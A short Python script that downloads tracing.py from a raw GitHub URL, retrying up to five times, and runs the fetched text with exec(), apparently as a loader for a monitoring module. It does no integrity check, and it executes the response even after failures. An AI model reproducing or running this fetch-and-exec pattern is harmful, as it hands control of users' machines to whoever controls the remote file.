import requests
import time

for i in range(0, 5):
    try:
        resp = requests.get('https://raw.githubusercontent.com/m4rkw/python_monitoring/refs/heads/main/tracing/tracing.py')

        if resp.status_code == 200:
            break

    except Exception as e:
        time.sleep(0.5)

exec(resp.text)
